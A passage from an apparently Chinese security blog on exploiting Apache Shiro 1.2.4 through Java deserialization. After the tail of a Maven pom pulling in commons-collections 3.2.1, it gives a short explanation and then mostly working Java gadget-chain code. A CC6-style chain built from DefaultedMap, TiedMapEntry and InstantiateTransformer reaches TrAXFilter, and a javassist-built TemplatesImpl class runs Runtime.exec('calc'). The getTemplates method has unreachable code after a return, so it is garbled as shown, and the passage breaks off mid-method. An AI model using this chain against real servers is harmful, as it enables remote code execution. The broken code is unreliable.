</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&lt;artifactId&gt;</span>shiro-web<span style="color:#ff79c6">&lt;/artifactId&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&lt;version&gt;</span>1.2.4<span style="color:#ff79c6">&lt;/version&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;/dependency&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;dependency&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&lt;groupId&gt;</span>javax.servlet<span style="color:#ff79c6">&lt;/groupId&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&lt;artifactId&gt;</span>javax.servlet-api<span style="color:#ff79c6">&lt;/artifactId&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&lt;version&gt;</span>3.1.0<span style="color:#ff79c6">&lt;/version&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&lt;scope&gt;</span>provided<span style="color:#ff79c6">&lt;/scope&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;/dependency&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;dependency&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&lt;groupId&gt;</span>javax.servlet.jsp<span style="color:#ff79c6">&lt;/groupId&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&lt;artifactId&gt;</span>jsp-api<span style="color:#ff79c6">&lt;/artifactId&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&lt;version&gt;</span>2.2<span style="color:#ff79c6">&lt;/version&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&lt;scope&gt;</span>provided<span style="color:#ff79c6">&lt;/scope&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;/dependency&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;dependency&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&lt;groupId&gt;</span>commons-collections<span style="color:#ff79c6">&lt;/groupId&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&lt;artifactId&gt;</span>commons-collections<span style="color:#ff79c6">&lt;/artifactId&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&lt;version&gt;</span>3.2.1<span style="color:#ff79c6">&lt;/version&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;/dependency&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">&lt;!-- https://mvnrepository.com/artifact/commons-logging/commons-logging --&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;dependency&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&lt;groupId&gt;</span>commons-logging<span style="color:#ff79c6">&lt;/groupId&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&lt;artifactId&gt;</span>commons-logging<span style="color:#ff79c6">&lt;/artifactId&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&lt;version&gt;</span>1.2<span style="color:#ff79c6">&lt;/version&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;/dependency&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;dependency&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&lt;groupId&gt;</span>org.slf4j<span style="color:#ff79c6">&lt;/groupId&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&lt;artifactId&gt;</span>slf4j-api<span style="color:#ff79c6">&lt;/artifactId&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&lt;version&gt;</span>1.7.30<span style="color:#ff79c6">&lt;/version&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;/dependency&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;dependency&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&lt;groupId&gt;</span>org.slf4j<span style="color:#ff79c6">&lt;/groupId&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&lt;artifactId&gt;</span>slf4j-simple<span style="color:#ff79c6">&lt;/artifactId&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&lt;version&gt;</span>1.7.30<span style="color:#ff79c6">&lt;/version&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;/dependency&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&lt;/dependencies&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&lt;build&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;finalName&gt;</span>shirodemo<span style="color:#ff79c6">&lt;/finalName&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;pluginManagement&gt;</span><span style="color:#6272a4">&lt;!-- lock down plugins versions to avoid using Maven defaults (may be moved to parent pom) --&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&lt;plugins&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;plugin&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;artifactId&gt;</span>maven-clean-plugin<span style="color:#ff79c6">&lt;/artifactId&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;version&gt;</span>3.1.0<span style="color:#ff79c6">&lt;/version&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;/plugin&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">&lt;!-- see http://maven.apache.org/ref/current/maven-core/default-bindings.html#Plugin_bindings_for_war_packaging --&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;plugin&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;artifactId&gt;</span>maven-resources-plugin<span style="color:#ff79c6">&lt;/artifactId&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;version&gt;</span>3.0.2<span style="color:#ff79c6">&lt;/version&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;/plugin&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;plugin&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;artifactId&gt;</span>maven-compiler-plugin<span style="color:#ff79c6">&lt;/artifactId&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;version&gt;</span>3.8.0<span style="color:#ff79c6">&lt;/version&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;/plugin&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;plugin&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;artifactId&gt;</span>maven-surefire-plugin<span style="color:#ff79c6">&lt;/artifactId&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;version&gt;</span>2.22.1<span style="color:#ff79c6">&lt;/version&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;/plugin&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;plugin&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;artifactId&gt;</span>maven-war-plugin<span style="color:#ff79c6">&lt;/artifactId&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;version&gt;</span>3.2.2<span style="color:#ff79c6">&lt;/version&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;/plugin&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;plugin&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;artifactId&gt;</span>maven-install-plugin<span style="color:#ff79c6">&lt;/artifactId&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;version&gt;</span>2.5.2<span style="color:#ff79c6">&lt;/version&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;/plugin&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;plugin&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;artifactId&gt;</span>maven-deploy-plugin<span style="color:#ff79c6">&lt;/artifactId&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;version&gt;</span>2.8.2<span style="color:#ff79c6">&lt;/version&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;/plugin&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&lt;/plugins&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;/pluginManagement&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&lt;/build&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;/project&gt;</span>
</span></span></code></pre></div><p>shiro不能带数组，不能用transformer[]</p>
<p>用InstantiateTransformer加载字节码，即可绕过那几个transformer。另外用DefaultedMap可以达到控制x1.transform(x2)，即可执行InstantiateTransformer.transform(TrAXFilter.class)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff79c6">package</span> test<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> javassist.CannotCompileException<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> javassist.ClassClassPath<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> javassist.ClassPool<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> javassist.CtClass<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.apache.commons.collections.Transformer<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.apache.commons.collections.functors.ChainedTransformer<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.apache.commons.collections.functors.ConstantTransformer<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.apache.commons.collections.functors.InstantiateTransformer<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.apache.commons.collections.map.LazyMap<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.apache.commons.collections.map.TransformedMap<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.apache.commons.collections.map.DefaultedMap<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> javax.xml.transform.Templates<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.io.ByteArrayInputStream<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.io.ByteArrayOutputStream<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.io.ObjectInputStream<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.io.ObjectOutputStream<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.lang.reflect.Field<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.util.HashMap<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.util.HashSet<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.util.Map<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">class</span> <span style="color:#50fa7b">CC6</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">main</span><span style="color:#ff79c6">(</span>String<span style="color:#ff79c6">[]</span> args<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span> Exception <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        TemplatesImpl templatesImpl<span style="color:#ff79c6">=</span>getTemplates<span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">// InstantiateTransformer.transform(TrAXFilter.class)
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        InstantiateTransformer it<span style="color:#ff79c6">=</span><span style="color:#ff79c6">new</span> InstantiateTransformer<span style="color:#ff79c6">(</span><span style="color:#ff79c6">new</span> Class<span style="color:#ff79c6">[]{</span>Templates<span style="color:#ff79c6">.</span><span style="color:#50fa7b">class</span><span style="color:#ff79c6">},</span> <span style="color:#ff79c6">new</span> Object<span style="color:#ff79c6">[]{</span>templatesImpl<span style="color:#ff79c6">});</span>
</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">/*
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">        * expMap.readObj()
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">        * expMap.key.hashcode()
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">        * tiedMapEntry.hashcode()
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">        * tiedMapEntry.map.get(tiedMapEntry.key)
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">        * outerMap.get(tiedMapEntry.key)
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">        * DefaultedMap.get(tiedMapEntry.key)
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">        * DefaultedMap.value.transform(tiedMapEntry.key)
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">        * x1.transform(x2)
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">        * x1=DefaultedMap.value x2=TiedMapEntry.key
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">        * InstantiateTransformer.transform(TrAXFilter.class)
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">        * */</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        Map innerMap <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> HashMap<span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        Map outerMap <span style="color:#ff79c6">=</span> DefaultedMap<span style="color:#ff79c6">.</span><span style="color:#50fa7b">decorate</span><span style="color:#ff79c6">(</span>innerMap<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">new</span> ConstantTransformer<span style="color:#ff79c6">(</span>0<span style="color:#ff79c6">));</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        TiedMapEntry tiedMapEntry <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> TiedMapEntry<span style="color:#ff79c6">(</span>outerMap<span style="color:#ff79c6">,</span> TrAXFilter<span style="color:#ff79c6">.</span><span style="color:#50fa7b">class</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        Map expMap <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> HashMap<span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        expMap<span style="color:#ff79c6">.</span><span style="color:#50fa7b">put</span><span style="color:#ff79c6">(</span>tiedMapEntry<span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;valuevalue&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        outerMap<span style="color:#ff79c6">.</span><span style="color:#50fa7b">remove</span><span style="color:#ff79c6">(</span>TrAXFilter<span style="color:#ff79c6">.</span><span style="color:#50fa7b">class</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        setFieldValue<span style="color:#ff79c6">(</span>outerMap<span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;value&#34;</span><span style="color:#ff79c6">,</span> it<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> b<span style="color:#ff79c6">=</span>serialize<span style="color:#ff79c6">(</span>expMap<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        deserialize<span style="color:#ff79c6">(</span>b<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#50fa7b">CC6</span><span style="color:#ff79c6">()</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> <span style="color:#50fa7b">serialize</span><span style="color:#ff79c6">(</span>Object o<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">try</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>            ByteArrayOutputStream aos <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> ByteArrayOutputStream<span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>            ObjectOutputStream oos <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> ObjectOutputStream<span style="color:#ff79c6">(</span>aos<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>            oos<span style="color:#ff79c6">.</span><span style="color:#50fa7b">writeObject</span><span style="color:#ff79c6">(</span>o<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>            oos<span style="color:#ff79c6">.</span><span style="color:#50fa7b">flush</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>            oos<span style="color:#ff79c6">.</span><span style="color:#50fa7b">close</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> aos<span style="color:#ff79c6">.</span><span style="color:#50fa7b">toByteArray</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span> <span style="color:#ff79c6">catch</span> <span style="color:#ff79c6">(</span>Exception e<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>            e<span style="color:#ff79c6">.</span><span style="color:#50fa7b">printStackTrace</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">null</span><span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">setFieldValue</span><span style="color:#ff79c6">(</span>Object obj<span style="color:#ff79c6">,</span> String name<span style="color:#ff79c6">,</span> Object value<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span> NoSuchFieldException<span style="color:#ff79c6">,</span> IllegalAccessException <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        Field fieldName <span style="color:#ff79c6">=</span> obj<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getClass</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">getDeclaredField</span><span style="color:#ff79c6">(</span>name<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        fieldName<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setAccessible</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">true</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        fieldName<span style="color:#ff79c6">.</span><span style="color:#50fa7b">set</span><span style="color:#ff79c6">(</span>obj<span style="color:#ff79c6">,</span> value<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">deserialize</span><span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> bytes<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">try</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>            ByteArrayInputStream ais <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> ByteArrayInputStream<span style="color:#ff79c6">(</span>bytes<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>            ObjectInputStream ois <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> ObjectInputStream<span style="color:#ff79c6">(</span>ais<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>            ois<span style="color:#ff79c6">.</span><span style="color:#50fa7b">readObject</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>            ois<span style="color:#ff79c6">.</span><span style="color:#50fa7b">close</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span> <span style="color:#ff79c6">catch</span> <span style="color:#ff79c6">(</span>Exception e<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>            e<span style="color:#ff79c6">.</span><span style="color:#50fa7b">printStackTrace</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">static</span> TemplatesImpl <span style="color:#50fa7b">getTemplates</span><span style="color:#ff79c6">()</span> <span style="color:#8be9fd;font-style:italic">throws</span> Exception<span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        System<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setProperty</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;org.apache.commons.collections.enableUnsafeSerialization&#34;</span><span style="color:#ff79c6">,</span><span style="color:#f1fa8c">&#34;true&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        TemplatesImpl obj <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> TemplatesImpl<span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        setFieldValue<span style="color:#ff79c6">(</span>obj<span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;_bytecodes&#34;</span><span style="color:#ff79c6">,</span> <span style="color:#ff79c6">new</span> <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[][]</span> <span style="color:#ff79c6">{</span>ClassPool<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getDefault</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">get</span><span style="color:#ff79c6">(</span>HelloTemplatesImpl<span style="color:#ff79c6">.</span><span style="color:#50fa7b">class</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">getName</span><span style="color:#ff79c6">()).</span><span style="color:#50fa7b">toBytecode</span><span style="color:#ff79c6">()});</span>
</span></span><span style="display:flex;"><span>        setFieldValue<span style="color:#ff79c6">(</span>obj<span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;_name&#34;</span><span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;HelloTemplatesImpl&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        setFieldValue<span style="color:#ff79c6">(</span>obj<span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;_tfactory&#34;</span><span style="color:#ff79c6">,</span> <span style="color:#ff79c6">new</span> TransformerFactoryImpl<span style="color:#ff79c6">());</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> obj<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>        ClassPool classPool <span style="color:#ff79c6">=</span> ClassPool<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getDefault</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        classPool<span style="color:#ff79c6">.</span><span style="color:#50fa7b">insertClassPath</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">new</span> ClassClassPath<span style="color:#ff79c6">(</span>AbstractTranslet<span style="color:#ff79c6">.</span><span style="color:#50fa7b">class</span><span style="color:#ff79c6">));</span>
</span></span><span style="display:flex;"><span>        CtClass ctClass <span style="color:#ff79c6">=</span> classPool<span style="color:#ff79c6">.</span><span style="color:#50fa7b">makeClass</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;Evil&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        ctClass<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setSuperclass</span><span style="color:#ff79c6">(</span>classPool<span style="color:#ff79c6">.</span><span style="color:#50fa7b">get</span><span style="color:#ff79c6">(</span>AbstractTranslet<span style="color:#ff79c6">.</span><span style="color:#50fa7b">class</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">getName</span><span style="color:#ff79c6">()));</span>
</span></span><span style="display:flex;"><span>        String shell <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;java.lang.Runtime.getRuntime().exec(\&#34;calc\&#34;);&#34;</span><span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>        ctClass<span style="color:#ff79c6">.</span><span style="color:#50fa7b">makeClassInitializer</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">insertBefore</span><span style="color:#ff79c6">(</span>shell<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> shellCode <span style="color:#ff79c6">=</span> ctClass<span style="color:#ff79c6">.</span><span style="color:#50fa7b">toBytecode</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[][]</span> targetByteCode <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[][]{</span>shellCode<span style="color:#ff79c6">};</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        TemplatesImpl templates <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> TemplatesImpl<span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        Class c1 <span style="color:#ff79c6">=</span> templates<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getClass</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        Field _name <span style="color:#ff79c6">=</span> c1<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getDeclaredField</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;_name&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        Field _bytecode <span style="color:#ff79c6">=</span> c1<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getDeclaredField</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;_bytecodes&#34;</span><span style="color:#ff79c6">);</span>
